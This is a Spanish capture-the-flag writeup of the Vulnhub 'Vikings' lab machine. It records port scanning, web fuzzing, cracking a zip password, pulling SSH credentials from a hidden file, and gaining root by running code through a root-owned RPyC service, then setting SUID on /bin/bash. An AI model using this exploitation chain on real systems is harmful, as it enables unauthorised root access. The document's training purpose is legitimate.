---
title: Vulnhub - Vikings
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, Vulnhub, Easy]
tags: [Linux, 'Information Leakage', Criptografía, Rpyc]
math: true
mermaid: true
image:
  path: /assets/images/Vulnhub/Easy/Vikings/logo.jpg
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Vikings Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnhub.

Técnicas usadas: **Information Leakage, Criptografía, Rpyc**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos en la **Máquina Vikings**

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/Vulnhub/Easy/Vikings/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos.

* **`nmap -p<Ports> -sCV  <IP> -oN versiones`**

    ![](/assets/images/Vulnhub/Easy/Vikings/02-versions.png)

    * Tenemos una página web en **http://<IP>/site/**

c. Enumeramos por archivos **.zip, .txt, .php, .php.bak**

```bash
wfuzz -c -t 50 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -z list,zip-txt-php-php.bak http://<IP>/site/FUZZ.FUZ2Z

000002545:   200        1 L      1 W        13 Ch       "war - txt" 
```

* Al ir al archivo **war.txt** veremos una ruta **/war-is-over**, y al ir conseguimos información, la cual nos descargaremos con cURL (La data está en **base64** por lo que antes de guardarla la decodemos)

    ```bash
    curl -s -X GET "http://192.168.100.14/site/war-is-over/" | base64 -d > data
    ```

d. Veremos el tipo de fichero

```bash
file data
data: Zip archive data, at least v5.1 to extract, compression method=AES Encrypted
```

* Cambiamos la extensión del archivo **mv data data.zip** y extraemos el hash para tratar de crackearlo con **john** usando el diccionario **rockyou.txt**

```bash
zip2john data.zip > hash
john hash -w=/usr/share/wordlists/rockyou.txt

ragnarok123
```

* Extraemos los archivos de **data.zip**, veremos que obtenemos un fichero **king**

e. Con **binwalk** extraeremos todo tipo de información de este fichero

```bash
binwalk -e king --run-as=root
```

Como resultado obtenemos un directorio **_king.extracted**, y dentro de este, el archivo **user**

```txt
//FamousBoatbuilder_floki@vikings                                     
//f@m0usboatbuilde7
```

f. Nos conectamos en el servicio SSH con las credenciales **floki:f@m0usboatbuilde7**

### Escalada de Privilegios 💹

a. En el directorio de **floki** existe el fichero **boat** y vemos que existe otro usuario **ragnar**

```bash
floki@vikings:~$ cat boat 
#Printable chars are your ally.
#num = 29th prime-number.
collatz-conjecture(num)
floki@vikings:~$ ls /home/
floki  ragnar
```

> La **conjetura de collatz** plantea que al realizar operaciones con un número, si es par lo dividimos en 2, caso contrario lo multiplicamos por 3 y el sumamos 1 y hacemos esta operación múltiples veces, siempre llegaremos al número 1, sin importar con que número empecemos. **Por ejemplo, tomando n = 6, la secuencia es: 6, 3, 10, 5, 16, 8, 4, 2, 1**
{: .prompt-tip }

b. Creamos un script en python con la lógica de la conjetura de collatz

```py

first_number = 109 # 29vo Numero Primo

password = chr(first_number)

while (first_number != 1):
	if (first_number % 2 == 0):
		first_number //= 2
	else:
		first_number = (first_number * 3) + 1

	if(first_number >= 32 and first_number <= 126):
		password += chr(first_number)

print(password)
---------------------------------------------------
mR)|>^/Gky[gz=\.F#j5P(
```

c. Intentamos autenticarnos como el usuario **ragnar** con la cadena obtenida previamente

```bash
floki@vikings:~$ su ragnar
Password: 
ragnar@vikings:/home/floki$ 
```

d. Leemos el archivo **.profile** del directorio personal de ragnar

```bash
ragnar@vikings:~$ cat .profile 
<SNIP>
sudo python3 /usr/local/bin/rpyc_classic.py
<SNIP>
```

> **`RPYC:`** (Remote Python Call) es un protocolo de comunicación utilizado para permitir la ejecución de código Python en un sistema remoto desde otro sistema, todo ello a través de la red. Por defecto, RPyC escucha en el puerto TCP 18812 para las conexiones de servicio y en el puerto TCP 18811 para las conexiones de registros.
{: .prompt-tip }

* De lo anterior observamos que podemos ejecutar **rpcy** como root, y al ver los puertos abiertos en la **Máquina Víctima** veremos que el puerto **18812** está abierto

e. Ejecutamos un comando usando rpcy

```python
import rpyc

def getshell():
    import subprocess
    result = subprocess.Popen("whoami", shell=True, stdout=subprocess.PIPE)
    return result.communicate()[0]

conn = rpyc.classic.connect("localhost")
fn = conn.teleport(getshell)
output = fn()
print(output.decode())
---------------------------------------------------------------------------
root
```

f. Asignamos el permiso **SUID** al bash **`chmod +s /bin/bash`** y spawneamos un shell como **root**

```bash
ragnar@vikings:~$ bash -p
bash-4.4# whoami
root
```